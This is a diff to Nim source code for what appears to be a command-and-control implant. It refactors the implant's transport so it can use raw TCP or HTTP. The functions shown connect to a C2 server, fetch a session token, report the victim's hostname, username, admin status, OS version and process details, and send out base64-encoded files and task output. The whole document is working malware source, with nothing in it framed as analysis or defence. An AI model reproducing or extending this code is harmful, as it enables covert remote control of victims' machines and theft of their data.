@@ -1,8 +1,22 @@
-import net, base64, json
+import std/[base64, json]
 
-proc sendData(client: Socket, data: string) =
-  client.send(encode(data) & "\r\n")
+when defined(tcp):
+  import std/net
+elif defined(http):
+  import std/httpclient
 
+import types
+
+proc sendData(app: App, data: string) =
+  when defined(tcp):
+    app.socket.send(encode(data) & "\r\n")
+  elif defined(http):
+    try:
+      discard app.httpClient.postContent(app.httpRoot & "/t?id=" & app.token, body=encode(data))
+      when defined(debug):
+        echo "sending " & data
+    except OSError:
+      return
 type DataType* = enum
   File, Text, Code, Image, Object
 
@@ -30,7 +44,7 @@ proc addData*(output: TaskOutput, dataType: DataType, name: string, contents: st
     output.data[name & "::object"] = enContents
 
 
-proc sendOutput*(client: Socket, taskOutput: TaskOutput) =
+proc sendOutput*(app: App, taskOutput: TaskOutput) =
   let j = %*
     {
       "task": taskOutput.task,
@@ -38,9 +52,9 @@ proc sendOutput*(client: Socket, taskOutput: TaskOutput) =
       "error": taskOutput.error,
       "data": taskOutput.data
     }
-  client.sendData($j)
+  app.sendData($j)
 
-proc identify*(client: Socket, taskId: int, hostname: string, isAdmin: bool, username: string, osType: string,
+proc identify*(app: App, taskId: int, hostname: string, isAdmin: bool, username: string, osType: string,
               windowsVersionInfo: tuple[majorVersion: int, minorVersion: int, buildNumber: int],
               linuxVersionInfo: tuple[kernelVersion: string], ownIntegrity: string, pid: int, pname: string) =
   let j = %*
@@ -66,9 +80,17 @@ proc identify*(client: Socket, taskId: int, hostname: string, isAdmin: bool, use
         }
       }
     }
-  client.sendData($j)
+  app.sendData($j)
 
-proc connectToC2*(client: Socket) =
+proc connectToC2*(app: App) =
+  when defined(http):
+    try:
+      let token = app.httpClient.getContent(app.httpRoot & "/r")
+      app.token = token
+      when defined(debug):
+        echo "got token: " & token
+    except OSError:
+      return
   let j = %*
     {
       "task": "connect",
@@ -76,9 +98,9 @@ proc connectToC2*(client: Socket) =
       "error": "",
       "data": {}
     }
-  client.sendData($j)
+  app.sendData($j)
 
-proc unknownTask*(client: Socket, taskId: int, taskName: string) =
+proc unknownTask*(app: App, taskId: int, taskName: string) =
   let j = %*
     {
       "task": taskName,
@@ -86,9 +108,9 @@ proc unknownTask*(client: Socket, taskId: int, taskName: string) =
       "error": "unknown task",
       "data": {}
     }
-  client.sendData($j)
+  app.sendData($j)
 
-proc sendFile*(client: Socket, taskId: int, path: string, b64c: string, error: string = "") =
+proc sendFile*(app: App, taskId: int, path: string, b64c: string, error: string = "") =
   let j = %*
     {
       "task": "file",
@@ -99,7 +121,7 @@ proc sendFile*(client: Socket, taskId: int, path: string, b64c: string, error: s
         "contents": b64c
       }
     }
-  client.sendData($j)
+  app.sendData($j)
 
 proc newTaskOutput*(taskId: int): TaskOutput =
   TaskOutput(
